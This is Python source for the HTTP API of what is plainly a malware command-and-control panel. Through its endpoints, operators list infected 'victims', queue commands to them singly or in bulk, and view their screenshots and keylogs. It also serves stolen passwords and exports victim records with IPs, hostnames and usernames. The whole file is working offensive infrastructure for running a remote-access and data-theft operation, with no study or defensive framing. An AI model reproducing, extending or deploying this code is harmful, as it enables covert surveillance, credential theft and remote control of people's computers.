class APIHandler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self._send_cors_headers()
        self.end_headers()
    
    def _send_cors_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Session-Token')
    
    def _send_json_response(self, status_code: int, data: Any):
        self.send_response(status_code)
        self._send_cors_headers()
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode('utf-8'))
    
    def _send_html_response(self, html: str):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))
    
    def _get_session(self) -> Optional[Dict]:
        session_token = self.headers.get('X-Session-Token')
        if session_token:
            return user_manager.verify_session(session_token)
        return None
    
    def _require_auth(self, required_role: UserRole = None) -> Optional[Dict]:
        session = self._get_session()
        if not session:
            self._send_json_response(401, {'error': 'Unauthorized'})
            return None
        
        if required_role and session['role'] != UserRole.ADMIN and session['role'] != required_role:
            self._send_json_response(403, {'error': 'Forbidden'})
            return None
        
        return session
    
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        query = urllib.parse.parse_qs(parsed.query)
        
        if path == '/':
            html = DashboardHTML.generate_dashboard()
            self._send_html_response(html)
        elif path == '/login':
            self._send_html_response(self._get_login_page())
        elif path == '/api/stats':
            session = self._require_auth()
            if session:
                self._send_json_response(200, victim_manager.get_stats())
        elif path == '/api/victims':
            session = self._require_auth()
            if session:
                limit = int(query.get('limit', [100])[0])
                offset = int(query.get('offset', [0])[0])
                filters = {}
                if 'status' in query:
                    filters['status'] = query['status'][0]
                if 'os' in query:
                    filters['os_type'] = query['os'][0]
                if 'search' in query:
                    filters['search'] = query['search'][0]
                
                victims = victim_manager.get_victims(filters, limit, offset)
                self._send_json_response(200, {'victims': victims, 'total': len(victims)})
        elif path == '/api/victims/online':
            session = self._require_auth()
            if session:
                victims = victim_manager.get_victims({'status': 'online'}, 100)
                self._send_json_response(200, {'victims': victims})
        elif path == '/api/victims/online/count':
            session = self._require_auth()
            if session:
                stats = victim_manager.get_stats()
                self._send_json_response(200, {'count': stats['online_victims']})
        elif path == '/api/victim':
            session = self._require_auth()
            if session:
                victim_id = query.get('id', [''])[0]
                with db.transaction() as conn:
                    victim = conn.execute(
                        "SELECT * FROM victims WHERE victim_id = ?",
                        (victim_id,)
                    ).fetchone()
                    if victim:
                        self._send_json_response(200, dict(victim))
                    else:
                        self._send_json_response(404, {'error': 'Victim not found'})
        elif path == '/api/commands/pending':
            session = self._require_auth()
            if session:
                victim_id = query.get('victim_id', [''])[0]
                if not victim_id:
                    self._send_json_response(400, {'error': 'victim_id required'})
                    return
                commands = victim_manager.get_pending_commands(victim_id)
                self._send_json_response(200, {'commands': commands})
        elif path == '/api/command/result':
            session = self._require_auth()
            if session:
                command_id = query.get('command_id', [''])[0]
                with db.transaction() as conn:
                    cmd = conn.execute(
                        "SELECT * FROM victim_commands WHERE command_id = ?",
                        (command_id,)
                    ).fetchone()
                    if cmd:
                        result = dict(cmd)
                        if result['result']:
                            result['result'] = json.loads(result['result'])
                        self._send_json_response(200, result)
                    else:
                        self._send_json_response(404, {'error': 'Command not found'})
        elif path == '/api/screenshot/latest':
            session = self._require_auth()
            if session:
                victim_id = query.get('victim_id', [''])[0]
                with db.transaction() as conn:
                    screenshot = conn.execute(
                        "SELECT * FROM screenshots WHERE victim_id = ? ORDER BY timestamp DESC LIMIT 1",
                        (victim_id,)
                    ).fetchone()
                    if screenshot:
                        self._send_json_response(200, {'screenshot': screenshot['image_data']})
                    else:
                        self._send_json_response(404, {'error': 'No screenshot available'})
        elif path == '/api/keylogs/latest':
            session = self._require_auth()
            if session:
                victim_id = query.get('victim_id', [''])[0]
                with db.transaction() as conn:
                    session_data = conn.execute(
                        "SELECT * FROM keylog_sessions WHERE victim_id = ? ORDER BY start_time DESC LIMIT 1",
                        (victim_id,)
                    ).fetchone()
                    if session_data:
                        result = dict(session_data)
                        result['keylog_data'] = json.loads(result['keylog_data']) if result['keylog_data'] else []
                        result['window_titles'] = json.loads(result['window_titles']) if result['window_titles'] else []
                        self._send_json_response(200, result)
                    else:
                        self._send_json_response(200, {'keylogs': [], 'active_window': '', 'clipboard': '', 'browser_url': ''})
        elif path == '/api/stolen':
            session = self._require_auth()
            if session:
                data_type = query.get('type', ['passwords'])[0]
                victim_id = query.get('victim_id', [None])[0]
                items = victim_manager.get_stolen_data(victim_id, data_type)
                self._send_json_response(200, {'items': items})
        elif path == '/api/export/all':
            session = self._require_auth(UserRole.ADMIN)
            if session:
                export_format = query.get('format', ['json'])[0]
                # Generate export
                self._send_json_response(200, {'status': 'export started', 'format': export_format})
        elif path == '/api/export/victims':
            session = self._require_auth()
            if session:
                export_format = query.get('format', ['csv'])[0]
                victims = victim_manager.get_victims(limit=10000)
                
                if export_format == 'csv':
                    output = io.StringIO()
                    writer = csv.writer(output)
                    writer.writerow(['ID', 'Country', 'OS', 'Status', 'Last Seen', 'IP', 'Hostname', 'Username', 'Infected'])
                    for v in victims:
                        writer.writerow([
                            v['victim_id'], v.get('country_name', ''), v.get('os_type', ''),
                            v.get('status', ''), v.get('last_seen', ''), v.get('ip_address', ''),
                            v.get('hostname', ''), v.get('username', ''), v.get('infection_date', '')
                        ])
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/csv')
                    self.send_header('Content-Disposition', 'attachment; filename="victims.csv"')
                    self.end_headers()
                    self.wfile.write(output.getvalue().encode('utf-8'))
                else:
                    self._send_json_response(200, {'victims': victims})
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        
        if path == '/api/login':
            self._handle_login()
        elif path == '/api/logout':
            session = self._get_session()
            if session:
                user_manager.logout(self.headers.get('X-Session-Token'))
            self._send_json_response(200, {'status': 'logged out'})
        elif path == '/api/register':
            self._handle_register()
        elif path == '/api/command':
            session = self._require_auth(UserRole.OPERATOR)
            if session:
                self._handle_command()
        elif path == '/api/bulk_action':
            session = self._require_auth(UserRole.OPERATOR)
            if session:
                self._handle_bulk_action()
        elif path == '/api/command/result':
            self._handle_command_result()
        elif path == '/api/victim/update':
            session = self._require_auth(UserRole.OPERATOR)
            if session:
                self._handle_victim_update()
        elif path == '/api/settings':
            session = self._require_auth(UserRole.ADMIN)
            if session:
                self._handle_settings_update()
        elif path == '/api/rebuild':
            session = self._require_auth(UserRole.ADMIN)
            if session:
                self._send_json_response(200, {'status': 'rebuilding', 'hash': secrets.token_hex(16)})
        else:
            self.send_response(404)
            self.end_headers()
    
    def _handle_login(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(body)
            
            username = data.get('username', '')
            password = data.get('password', '')
            
            session_token, role = user_manager.authenticate(username, password)
            
            if session_token:
                self._send_json_response(200, {
                    'session_token': session_token,
                    'role': role.value,
                    'username': username
                })
            else:
                self._send_json_response(401, {'error': 'Invalid credentials'})
        except Exception as e:
            self._send_json_response(400, {'error': str(e)})
    
    def _handle_register(self):
        session = self._require_auth(UserRole.ADMIN)
        if not session:
            return
        
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(body)
            
            username = data.get('username')
            password = data.get('password')
            role = UserRole(data.get('role', 'viewer'))
            
            if user_manager.create_user(username, password, role):
                user_manager.log_audit(
                    session['user_id'], 'create_user', 'user', username,
                    f'Created user with role {role.value}', self.client_address[0]
                )
                self._send_json_response(201, {'status': 'created'})
            else:
                self._send_json_response(400, {'error': 'Username already exists'})
        except Exception as e:
            self._send_json_response(400, {'error': str(e)})
    
    def _handle_command(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(body)
            
            victim_id = data.get('victim_id')
            command = data.get('command')
            params = data.get('params', {})
            
            if not victim_id or not command:
                self._send_json_response(400, {'error': 'victim_id and command required'})
                return
            
            command_id = victim_manager.add_command(victim_id, command, params)
            
            self._send_json_response(200, {
                'status': 'queued',
                'command_id': command_id
            })
        except Exception as e:
            self._send_json_response(400, {'error': str(e)})
    
    def _handle_bulk_action(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(body)
            
            victim_ids = data.get('victim_ids', [])
            action = data.get('action')
            params = data.get('params', {})
            
            queued = 0
            for victim_id in victim_ids:
                victim_manager.add_command(victim_id, action, params)
                queued += 1
            
            self._send_json_response(200, {'queued': queued})
        except Exception as e:
            self._send_json_response(400, {'error': str(e)})
    
    def _handle_command_result(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(body)
            
            token = data.get('token')
            command_id = data.get('command_id')
            result = data.get('result')
            
            is_valid, victim_id, _ = token_manager.verify_token(token)
            if not is_valid:
                self._send_json_response(401, {'error': 'Invalid token'})
                return
            
            victim_manager.update_command_result(command_id, result)
            self._send_json_response(200, {'status': 'updated'})
        except Exception as e:
            self._send_json_response(400, {'error': str(e)})
    
    def _handle_victim_update(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(body)
            
            victim_id = data.get('victim_id')
            tags = data.get('tags')
            notes = data.get('notes')
            
            with db.transaction() as conn:
                conn.execute(
                    "UPDATE victims SET tags = ?, notes = ? WHERE victim_id = ?",
                    (tags, notes, victim_id)
                )
            
            self._send_json_response(200, {'status': 'updated'})
        except Exception as e:
            self._send_json_response(400, {'error': str(e)})
    
    def _handle_settings_update(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(body)
            
            # Update config
            for key, value in data.items():
                if hasattr(config, key.upper()):
                    setattr(config, key.upper(), value)
            
            self._send_json_response(200, {'status': 'settings updated'})
        except Exception as e:
            self._send_json_response(400, {'error': str(e)})
    
